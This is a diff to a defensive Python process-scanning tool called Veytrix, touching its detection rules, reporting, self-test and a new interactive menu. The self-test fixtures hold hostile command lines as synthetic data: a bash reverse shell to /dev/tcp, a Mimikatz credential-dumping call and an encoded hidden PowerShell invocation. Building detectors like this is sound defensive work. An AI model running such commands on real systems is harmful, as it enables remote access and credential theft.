-    """R-026: Process with LD_PRELOAD set to suspicious path."""
+def rule_ld_preload_injection(ctx):
     if not IS_LINUX:
         return []
     out = []
@@ -1026,28 +946,26 @@ def rule_ld_preload_injection(ctx: SystemContext) -> list[Finding]:
                             "high", 0.85,
                             [f"PID {p.pid} ({p.name})",
                              f"LD_PRELOAD={path}",
-                             "User-writable LD_PRELOAD = classic injection"],
+                             "Classic injection"],
                             "T1574.006", p.pid, p.name,
-                            "Likely userland hooking. Inspect library."))
+                            "Userland hooking. Inspect library."))
         except (FileNotFoundError, PermissionError, ProcessLookupError):
             continue
     return out
 
 
 ALL_RULES = [
-    # V1 pattern-based
     rule_encoded_powershell, rule_hidden_execution, rule_download_cradle,
     rule_office_spawns_shell, rule_browser_spawns_shell,
     rule_suspicious_location, rule_credential_access, rule_lsass_access,
     rule_reverse_shell, rule_base64_pipe, rule_suspicious_port,
     rule_beaconing, rule_masquerading_name,
-    # V2 advanced heuristic
     rule_unsigned_binary, rule_wrong_parent_chain, rule_rwx_memory,
     rule_anonymous_exec_memory, rule_orphaned_with_network,
     rule_hidden_process, rule_suspicious_kernel_module,
     rule_self_signed_tls, rule_web_server_spawns_shell,
-    rule_cross_platform_spawn, rule_suspicious_child_of_browser_jit,
-    rule_memfd_or_deleted_binary, rule_ld_preload_injection,
+    rule_cross_platform_spawn, rule_browser_jit_child,
+    rule_memfd_deleted_binary, rule_ld_preload_injection,
 ]
 
 
@@ -1055,10 +973,10 @@ ALL_RULES = [
 # Engine
 # ═════════════════════════════════════════════════════════════════════════════
 
-def scan(ctx: Optional[SystemContext] = None) -> list[Finding]:
+def scan(ctx=None):
     if ctx is None:
         ctx = SystemContext.capture()
-    findings: list[Finding] = []
+    findings = []
     for rule in ALL_RULES:
         try:
             findings.extend(rule(ctx))
@@ -1073,7 +991,7 @@ def scan(ctx: Optional[SystemContext] = None) -> list[Finding]:
 # Output
 # ═════════════════════════════════════════════════════════════════════════════
 
-def print_findings(findings: list[Finding], ctx: SystemContext) -> None:
+def print_findings(findings, ctx):
     print()
     print(f"{C.BOLD}{C.CYAN}{'═' * 72}{C.RESET}")
     print(f"{C.BOLD}{C.CYAN}  VEYTRIX DETECTION  —  {ctx.scan_time[:19]}Z"
@@ -1088,8 +1006,8 @@ def print_findings(findings: list[Finding], ctx: SystemContext) -> None:
 
     if not findings:
         print(f"{C.GREEN}  ✓ No suspicious activity detected.{C.RESET}")
-        print(f"{C.DIM}    Clean scan ≠ clean system. Detection is heuristic."
-              f"{C.RESET}\n")
+        print(f"{C.DIM}    Clean scan ≠ clean system. "
+              f"Detection is heuristic.{C.RESET}\n")
         return
 
     for i, f in enumerate(findings, 1):
@@ -1108,7 +1026,7 @@ def print_findings(findings: list[Finding], ctx: SystemContext) -> None:
         print()
 
 
-def print_summary(findings: list[Finding]) -> None:
+def print_summary(findings):
     counts = {s: 0 for s in SEVERITIES}
     for f in findings:
         counts[f.severity] += 1
@@ -1119,7 +1037,7 @@ def print_summary(findings: list[Finding]) -> None:
             print(f"  {color}{s.upper():<10}{C.RESET} {counts[s]}")
 
 
-def print_checks(ctx: SystemContext) -> None:
+def print_checks(ctx):
     print(f"\n{C.BOLD}Detection checks executed:{C.RESET}")
     ran = sum(1 for c in ctx.checks if c.status == "ran")
     skipped = sum(1 for c in ctx.checks if c.status == "skipped")
@@ -1133,7 +1051,7 @@ def print_checks(ctx: SystemContext) -> None:
         print(f"  {color}[{c.status:>7}]{C.RESET} {c.name}"
               + (f" — {c.reason}" if c.reason else ""))
     if denied > 0:
-        print(f"\n{C.YELLOW}⚠ Some checks were denied — run as "
+        print(f"\n{C.YELLOW}⚠ Some checks denied — run as "
               f"{'Administrator' if IS_WINDOWS else 'root'} for full coverage."
               f"{C.RESET}")
 
@@ -1142,7 +1060,7 @@ def print_checks(ctx: SystemContext) -> None:
 # Self-test
 # ═════════════════════════════════════════════════════════════════════════════
 
-def _self_test_context() -> SystemContext:
+def _self_test_context():
     ctx = SystemContext()
     ctx.own_pid = -1
 
@@ -1151,7 +1069,6 @@ def _self_test_context() -> SystemContext:
         ctx.processes.append(p)
         ctx.procs_by_pid[pid] = p
 
-    # V1 rules
     add(9001, 1, "powershell.exe",
         r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "powershell -nop -w hidden -enc SQBFAFgA")
@@ -1162,32 +1079,25 @@ def _self_test_context() -> SystemContext:
     add(9004, 1, "mimikatz.exe", r"C:\Users\Public\mimikatz.exe",
         "mimikatz.exe sekurlsa::logonpasswords")
     add(9005, 1, "bash", "/bin/bash", "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1")
-
-    # V2 rules
-    # R-015: svchost with wrong parent
     add(9010, 1, "svchost.exe", r"C:\Windows\System32\svchost.exe",
         "svchost.exe -k netsvcs")
     add(9011, 9010, "svchost.exe", r"C:\Windows\System32\svchost.exe",
-        "svchost.exe")  # parent should be services.exe, not svchost
-    # R-014: unsigned binary from user dir
+        "svchost.exe")
     add(9020, 1, "custom.exe", r"C:\Users\bob\custom.exe", "custom.exe")
-    # R-022: web server spawns shell
     add(9030, 1, "nginx", "/usr/sbin/nginx", "nginx: worker")
     add(9031, 9030, "bash", "/bin/bash", "bash")
-    # R-024: browser spawns shell
-    add(9040, 1, "chrome.exe", r"C:\Program Files\Google\Chrome\chrome.exe",
-        "chrome.exe")
-    add(9041, 9040, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+    add(9040, 1, "chrome.exe",
+        r"C:\Program Files\Google\Chrome\chrome.exe", "chrome.exe")
+    add(9041, 9040, "powershell.exe",
+        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "powershell.exe")
-    # R-011: suspicious port
     ctx.connections.append(ConnInfo(9005, "bash", "1.2.3.4", 54321,
                                     "9.9.9.9", 4444, "ESTABLISHED"))
     ctx.conns_by_pid[9005] = [ctx.connections[-1]]
-
     return ctx
 
 
-def cmd_self_test() -> int:
+def cmd_self_test():
     print(f"{C.BOLD}{C.CYAN}Self-test on synthetic events...{C.RESET}\n")
     ctx = _self_test_context()
     findings = scan(ctx)
@@ -1200,9 +1110,9 @@ def cmd_self_test() -> int:
     missing = expected - caught
     print()
     if missing:
-        print(f"{C.RED}✗ MISSING rules: {sorted(missing)}{C.RESET}")
+        print(f"{C.RED}✗ MISSING: {sorted(missing)}{C.RESET}")
         return 1
-    print(f"{C.GREEN}✓ Self-test passed — {len(expected)} expected rules fired."
+    print(f"{C.GREEN}✓ Self-test passed — {len(expected)} rules fired."
           f"{C.RESET}")
     return 0
 
@@ -1211,7 +1121,7 @@ def cmd_self_test() -> int:
 # Storage + HTML
 # ═════════════════════════════════════════════════════════════════════════════
 
-def save_to_sqlite(findings: list[Finding], path: str) -> None:
+def save_to_sqlite(findings, path):
     conn = sqlite3.connect(path)
     try:
         conn.execute("""
@@ -1238,14 +1148,15 @@ def save_to_sqlite(findings: list[Finding], path: str) -> None:
         conn.close()
 
 
-def generate_html_report(findings: list[Finding], ctx: SystemContext,
-                          output: str) -> str:
+def generate_html_report(findings, ctx, output):
     sev_color = {"low": "#28a745", "medium": "#ffc107",
                  "high": "#fd7e14", "critical": "#dc3545"}
     rows = []
     for f in findings:
         color = sev_color[f.severity]
         ev_html = "".join(f"<li>{html.escape(e)}</li>" for e in f.evidence)
+        rem = (f'<p class="rem"><strong>Remediation:</strong> '
+               f'{html.escape(f.remediation)}</p>' if f.remediation else '')
         rows.append(f"""
         <div class="finding" style="border-left-color:{color}">
           <h3><span class="badge" style="background:{color}">
@@ -1253,8 +1164,7 @@ def generate_html_report(findings: list[Finding], ctx: SystemContext,
           <p class="meta">Rule: {f.rule_id} · {f.technique} ·
              conf {int(f.confidence*100)}%</p>
           <ul>{ev_html}</ul>
-          {f'<p class="rem"><strong>Remediation:</strong> '
-           f'{html.escape(f.remediation)}</p>' if f.remediation else ''}
+          {rem}
         </div>""")
     html_out = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
 <title>Veytrix Detection Report</title>
@@ -1276,8 +1186,6 @@ def generate_html_report(findings: list[Finding], ctx: SystemContext,
  <p>Generated: {ctx.scan_time}</p>
  <p>Platform: {ctx.platform} · Processes: {len(ctx.processes)} ·
     Connections: {len(ctx.connections)} · Findings: {len(findings)}</p>
- <p>Checks ran: {sum(1 for c in ctx.checks if c.status=='ran')} ·
-    Denied: {sum(1 for c in ctx.checks if c.status=='denied')}</p>
 </div>
 {''.join(rows) if rows else '<p class="clean">✓ No findings.</p>'}
 </body></html>"""
@@ -1286,13 +1194,16 @@ def generate_html_report(findings: list[Finding], ctx: SystemContext,
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-# CLI
+# Command handlers
 # ═════════════════════════════════════════════════════════════════════════════
 
-def cmd_scan(args) -> int:
+def cmd_scan(args):
     if not HAS_PSUTIL:
-        print(f"{C.RED}psutil required: pip install psutil{C.RESET}",
-              file=sys.stderr)
+        print(f"\n{C.RED}{C.BOLD}ERROR: psutil is not installed.{C.RESET}")
+        print(f"{C.RED}psutil is required for process scanning.{C.RESET}")
+        print(f"\n{C.YELLOW}Install it with:{C.RESET}")
+        print(f"  {C.BOLD}pip install psutil{C.RESET}")
+        print()
         return 1
     ctx = SystemContext.capture()
     findings = scan(ctx)
@@ -1329,13 +1240,16 @@ def cmd_scan(args) -> int:
                         for f in findings) else 2
 
 
-def cmd_watch(args) -> int:
+def cmd_watch(args):
     if not HAS_PSUTIL:
-        print(f"{C.RED}psutil required.{C.RESET}", file=sys.stderr)
+        print(f"\n{C.RED}{C.BOLD}ERROR: psutil is not installed.{C.RESET}")
+        print(f"\n{C.YELLOW}Install it with:{C.RESET}")
+        print(f"  {C.BOLD}pip install psutil{C.RESET}")
+        print()
         return 1
     print(f"{C.BOLD}{C.CYAN}Continuous monitoring "
-          f"(interval {args.interval}s, Ctrl+C){C.RESET}\n")
-    seen: set[str] = set()
+          f"(interval {args.interval}s, Ctrl+C to stop){C.RESET}\n")
+    seen = set()
     try:
         while True:
             ctx = SystemContext.capture()
@@ -1353,13 +1267,16 @@ def cmd_watch(args) -> int:
                       f"{len(ctx.connections)} conns){C.RESET}")
             time.sleep(args.interval)
     except KeyboardInterrupt:
-        print(f"\n{C.BOLD}Stopped. Total unique findings: {len(seen)}"
-              f"{C.RESET}")
+        print(f"\n{C.BOLD}Stopped. Unique findings: {len(seen)}{C.RESET}")
         return 0
 
 
-def cmd_report(args) -> int:
+def cmd_report(args):
     if not HAS_PSUTIL:
+        print(f"\n{C.RED}{C.BOLD}ERROR: psutil is not installed.{C.RESET}")
+        print(f"\n{C.YELLOW}Install it with:{C.RESET}")
+        print(f"  {C.BOLD}pip install psutil{C.RESET}")
+        print()
         return 1
     ctx = SystemContext.capture()
     findings = scan(ctx)
@@ -1368,34 +1285,119 @@ def cmd_report(args) -> int:
     return 0
 
 
-def main(argv=None) -> int:
+# ═════════════════════════════════════════════════════════════════════════════
+# Interactive menu + main
+# ═════════════════════════════════════════════════════════════════════════════
+
+def _pause_if_needed():
+    """Keep window open when double-clicked. Skip if CLI args given."""
+    if os.environ.get("VEYTRIX_NO_PAUSE") == "1":
+        return
+    if len(sys.argv) > 1:
+        return
+    try:
+        input("\nPress Enter to exit...")
+    except Exception:
+        pass
+
+
+def _interactive_menu() -> int:
+    print("=" * 60)
+    print(f"  VEYTRIX DETECTION ENGINE  V{VERSION}")
+    print("=" * 60)
+    print()
+
+    if not HAS_PSUTIL:
+        print(f"  {C.RED}[!] psutil is NOT installed — required for scanning{C.RESET}")
+        print(f"      Install:  pip install psutil")
+        print()
+    if not HAS_CRYPTO:
+        print(f"  {C.DIM}[i] cryptography optional (TLS check R-021){C.RESET}")
+        print(f"      Install:  pip install cryptography")
+        print()
+
+    print("  Choose an action:")
+    print("    1) Self-test (prove 26 rules work)")
+    print("    2) Scan this machine")
+    print("    3) Scan + coverage report (--checks)")
+    print("    4) Generate HTML report")
+    print("    5) Continuous watch")
+    print("    6) Quit")
+    print()
+
+    try:
+        choice = input("  Enter choice [1-6]: ").strip()
+    except (EOFError, KeyboardInterrupt):
+        return 0
+
+    print()
+    if choice == "1":
+        return cmd_self_test()
+    if choice == "2":
+        return _run_with_args(["scan"])
+    if choice == "3":
+        return _run_with_args(["scan", "--checks"])
+    if choice == "4":
+        return _run_with_args(["report", "--out", "veytrix_report.html"])
+    if choice == "5":
+        return _run_with_args(["watch"])
+    return 0
+
+
+def _run_with_args(argv_list) -> int:
     p = argparse.ArgumentParser(prog="veytrix_detect")
     p.add_argument("--version", action="version",
                    version=f"%(prog)s {VERSION}")
-    sub = p.add_subparsers(dest="cmd", required=True)
+    sub = p.add_subparsers(dest="cmd", required=False)
 
     sp = sub.add_parser("scan", help="one-shot scan")
     sp.add_argument("--json", action="store_true")
     sp.add_argument("--db")
     sp.add_argument("--report")
-    sp.add_argument("--checks", action="store_true",
-                    help="show which checks ran/skipped")
+    sp.add_argument("--checks", action="store_true")
 
-    sp = sub.add_parser("watch")
+    sp = sub.add_parser("watch", help="continuous monitoring")
     sp.add_argument("--interval", type=int, default=10)
     sp.add_argument("--db")
 
-    sp = sub.add_parser("report")
+    sp = sub.add_parser("report", help="HTML report")
     sp.add_argument("--out", default="veytrix_report.html")
 
-    sub.add_parser("self-test")
+    sub.add_parser("self-test", help="prove rules work")
 
-    args = p.parse_args(argv)
-    if args.cmd == "scan": return cmd_scan(args)
-    if args.cmd == "watch": return cmd_watch(args)
-    if args.cmd == "report": return cmd_report(args)
-    if args.cmd == "self-test": return cmd_self_test()
+    args = p.parse_args(argv_list)
+    if args.cmd is None:
+        return _interactive_menu()
+    if args.cmd == "scan":
+        return cmd_scan(args)
+    if args.cmd == "watch":
+        return cmd_watch(args)
+    if args.cmd == "report":
+        return cmd_report(args)
+    if args.cmd == "self-test":
+        return cmd_self_test()
     return 1
+
+
+def main(argv=None) -> int:
+    try:
+        if argv is None:
+            argv = sys.argv[1:]
+        if not argv:
+            return _interactive_menu()
+        return _run_with_args(list(argv))
+    except KeyboardInterrupt:
+        print("\nInterrupted.")
+        return 130
+    except SystemExit:
+        raise
+    except Exception as exc:
+        import traceback
+        print(f"\nERROR: {exc}", file=sys.stderr)
+        traceback.print_exc()
+        return 1
+    finally:
+        _pause_if_needed()
 
 
 if __name__ == "__main__":
